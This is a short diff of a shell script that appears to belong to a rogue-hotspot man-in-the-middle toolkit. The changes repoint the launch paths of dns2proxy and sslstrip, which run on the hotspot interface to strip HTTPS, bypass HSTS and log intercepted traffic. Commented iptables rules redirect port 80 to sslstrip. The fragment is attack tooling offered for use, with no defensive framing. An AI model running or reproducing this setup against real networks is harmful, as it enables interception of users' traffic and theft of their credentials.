@@ -345,7 +345,7 @@ then
 	#start dns2proxy on interface_hotspot (sslstrip should be started before, to allow dns2proxy to revert hsts changes)
 	
 	echo "Start dns2proxy for sslstrip"
-	python $SCRIPTPATH/sslstrip-hsts/dns2proxy_no_debug.py $interface_hotspot $LOGDIR > /dev/null&
+	python $SCRIPTPATH/dns2proxy/dns2proxy_no_debug.py $interface_hotspot $LOGDIR > /dev/null&
 	#python dns2proxy_no_debug.py $interface_hotspot&
 	##########
 	# sslstrip (with hsts bypass, dns2proxy needed to revert changes)
@@ -353,7 +353,7 @@ then
 	##########
 	# python sslstrip.py -l 10000 -a -w ${LOGPREFIX}sslstrip.log&
 	echo "Start sslstrip for sslstrip"
-	python $SCRIPTPATH/sslstrip-hsts/sslstrip.py -w ${LOGPREFIX}sslstrip.log 2>&1 > /dev/null&
+	python $SCRIPTPATH/sslstrip2/sslstrip.py -w ${LOGPREFIX}sslstrip.log 2>&1 > /dev/null&
 
 	#iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	#iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp ! -d $interface_hotspot_ip -port 80 -j REDIRECT --to-port 10000
